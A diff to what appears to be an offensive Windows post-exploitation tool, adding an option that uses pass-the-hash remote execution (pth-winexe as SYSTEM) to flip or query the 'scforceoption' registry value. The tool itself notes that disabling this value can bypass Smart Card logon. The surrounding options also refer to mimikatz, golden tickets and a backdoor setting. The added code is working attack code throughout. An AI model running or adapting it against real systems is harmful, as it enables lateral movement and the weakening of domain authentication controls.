@@ -1261,6 +1261,8 @@ p.add_argument("-rU", "--edq_uac", dest="edq_uac", default="n", help="<Optional>
 p.add_argument("-rA", "--edq_autologon", dest="edq_autologon", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery AutoLogon Registry Setting")
 p.add_argument("-rS", "--edq_allowtgtsessionkey", dest="edq_allowtgtsessionkey", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery allowtgtsessionkey Registry Setting")
 p.add_argument("-rM", "--edq_SingleSessionPerUser", dest="edq_SingleSessionPerUser", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery RDP SingleSessionPerUser Registry Setting")
+p.add_argument("-rC", "--edq_scforceoption", dest="edq_scforceoption", default="n", help="<Optional> (E)nable/(D)isable/(Q)uery Smart Card scforceoption Registry Setting")
+
 
 args = p.parse_args()
 
@@ -1296,6 +1298,7 @@ edq_wdigest=args.edq_wdigest
 edq_backdoor=args.edq_backdoor
 qldap=args.qldap
 edq_uac=args.edq_uac
+edq_scforceoption=args.edq_scforceoption
 stealth_mimi=args.stealth_mimi
 mimikittenz=args.mimikittenz
 golden_ticket=args.golden_ticket
@@ -1447,8 +1450,48 @@ if password_policy in yesanswers:
 		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
 		sys.exit()
 
-#[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
-#"fSingleSessionPerUser"=dword:00000000
+if edq_scforceoption!='n':
+	if len(targets)==1:
+		try:
+			if edq_scforceoption=='e':
+				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
+
+				print colored("[+]Enabling SCforceoption:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 1' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				print colored("[+]Querying the status of SCforceoption:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				sys.exit()	
+
+			elif edq_scforceoption=='d':
+				print colored("\n[+]IMPORTANT - Leave SCforceoption in the state that you found it\n\n",'red')
+								
+				print colored("[+]Disabling SCforceoption:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"ADD\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\" /t REG_DWORD /f /D 0' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				print colored("[+]Querying the status of SCforceoption:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+
+				sys.exit()	
+	
+			elif edq_scforceoption=='q':
+				print colored("\n[+]INFO - Disabling this setting can be used to bypass Smart Card Logon\n\n",'red')
+				print colored("[+]Querying the status of SCforceoption:",'green')
+				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				print proc.communicate()[0]
+				
+				sys.exit()	
+		except OSError:
+				print colored("[-]Something went wrong...",'red')
+				sys.exit()	
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
 
 if edq_SingleSessionPerUser!='n':
 	if len(targets)==1:
